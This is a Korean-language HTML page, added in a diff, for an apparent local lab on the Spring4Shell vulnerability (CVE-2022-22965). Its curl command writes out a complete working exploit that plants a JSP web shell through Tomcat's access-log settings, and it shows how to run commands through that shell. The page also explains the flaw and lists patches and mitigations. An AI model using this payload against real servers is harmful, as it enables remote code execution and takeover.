@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spring4Shell 취약점 테스트</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: #1a1a1a;
+            color: #00ff00;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #0a0a0a;
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            padding: 30px;
+        }
+
+        h1 {
+            color: #ff0000;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .warning {
+            background: #ff0000;
+            color: #fff;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .section {
+            margin: 20px 0;
+            padding: 20px;
+            background: #1a1a1a;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+        }
+
+        .section h2 {
+            color: #00ffff;
+            margin-bottom: 15px;
+        }
+
+        button {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-weight: bold;
+            margin: 5px;
+        }
+
+        button:hover {
+            background: #00cc00;
+        }
+
+        pre {
+            background: #000;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            margin-top: 10px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            background: #000;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+
+        .status {
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+
+        .status.success {
+            background: #004400;
+            border: 1px solid #00ff00;
+        }
+
+        .status.error {
+            background: #440000;
+            border: 1px solid #ff0000;
+            color: #ff0000;
+        }
+
+        .code-block {
+            background: #000;
+            padding: 10px;
+            border-left: 3px solid #00ff00;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚠️ Spring4Shell (CVE-2022-22965) 취약점 테스트 ⚠️</h1>
+
+        <div class="warning">
+            ⚠️ 경고: 이 페이지는 교육 목적으로만 사용됩니다. 격리된 환경에서만 실행하세요!
+        </div>
+
+        <!-- 환경 정보 -->
+        <div class="section">
+            <h2>1. 환경 정보</h2>
+            <div class="code-block">
+                <strong>Spring Boot Version:</strong> 2.6.2 (취약함)<br>
+                <strong>Java Version:</strong> 17<br>
+                <strong>취약한 엔드포인트:</strong> /vulnerable/exploit<br>
+                <strong>취약점:</strong> CVE-2022-22965 (Spring4Shell)
+            </div>
+        </div>
+
+        <!-- 취약점 체크 -->
+        <div class="section">
+            <h2>2. 취약점 확인</h2>
+            <button onclick="checkVulnerability()">취약점 확인</button>
+            <div id="checkResult"></div>
+        </div>
+
+        <!-- Exploit 실행 -->
+        <div class="section">
+            <h2>3. Exploit 실행 (수동)</h2>
+            <p>아래 Python 스크립트를 사용하여 exploit을 실행하세요:</p>
+            <pre>python spring4shell_exploit.py -u http://localhost:8080/vulnerable/exploit</pre>
+
+            <p>또는 curl 명령어:</p>
+            <pre>curl -X POST http://localhost:8080/vulnerable/exploit \
+  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i" \
+  -d "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \
+  -d "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT" \
+  -d "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell" \
+  -d "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="</pre>
+        </div>
+
+        <!-- 취약점 원리 -->
+        <div class="section">
+            <h2>4. 취약점 원리</h2>
+            <div class="code-block">
+                <strong>1단계:</strong> Spring의 데이터 바인딩 메커니즘 악용<br>
+                - class.module.classLoader 경로를 통해 ClassLoader 접근<br><br>
+
+                <strong>2단계:</strong> Tomcat AccessLogValve 조작<br>
+                - pipeline.first.pattern에 악의적인 JSP 코드 삽입<br>
+                - 로그 파일을 .jsp 확장자로 생성<br><br>
+
+                <strong>3단계:</strong> 웹쉘 생성 및 실행<br>
+                - 생성된 JSP 파일에 접근하여 원격 명령 실행<br>
+                - URL: /shell.jsp?pwd=j&cmd=whoami
+            </div>
+        </div>
+
+        <!-- 방어 방법 -->
+        <div class="section">
+            <h2>5. 방어 방법</h2>
+            <div class="code-block">
+                <strong>✅ 패치:</strong><br>
+                - Spring Boot 2.6.6+ 또는 2.5.12+ 업그레이드<br>
+                - Spring Framework 5.3.18+ 또는 5.2.20+ 업그레이드<br><br>
+
+                <strong>✅ 임시 완화:</strong><br>
+                - Java 9 미만 버전 사용 (근본적 해결 아님)<br>
+                - WAF 규칙 추가 (class.module.classLoader 패턴 차단)<br>
+                - @InitBinder로 위험한 필드 차단<br><br>
+
+                <strong>✅ 모니터링:</strong><br>
+                - AccessLogValve 설정 변경 감지<br>
+                - 비정상적인 JSP 파일 생성 모니터링
+            </div>
+        </div>
+
+        <!-- 테스트 결과 -->
+        <div class="section">
+            <h2>6. 테스트 결과</h2>
+            <div id="testResults">
+                <p>Python 스크립트 실행 후 결과가 여기에 표시됩니다.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        async function checkVulnerability() {
+            const resultDiv = document.getElementById('checkResult');
+            resultDiv.innerHTML = '<p>확인 중...</p>';
+
+            try {
+                const response = await fetch('/vulnerable/test');
+                const text = await response.text();
+
+                if (response.ok) {
+                    resultDiv.innerHTML = `
+                        <div class="status success">
+                            <strong>✅ 취약한 엔드포인트 접근 가능</strong><br>
+                            응답: ${text}<br>
+                            <br>
+                            <strong>환경 정보:</strong><br>
+                            - URL: ${window.location.origin}/vulnerable/exploit<br>
+                            - Method: POST<br>
+                            - Spring Boot: 2.6.2 (취약함)<br>
+                            - Java: 17<br>
+                            <br>
+                            <strong>다음 단계:</strong><br>
+                            터미널에서 Python 스크립트를 실행하세요:<br>
+                            <code style="color: #00ffff;">python spring4shell_exploit.py -u http://localhost:8080/vulnerable/exploit</code>
+                        </div>
+                    `;
+                } else {
+                    resultDiv.innerHTML = `
+                        <div class="status error">
+                            ❌ 엔드포인트 접근 실패 (Status: ${response.status})
+                        </div>
+                    `;
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div class="status error">
+                        ❌ 오류: ${error.message}
+                    </div>
+                `;
+            }
+        }
+    </script>
+</body>
+</html>
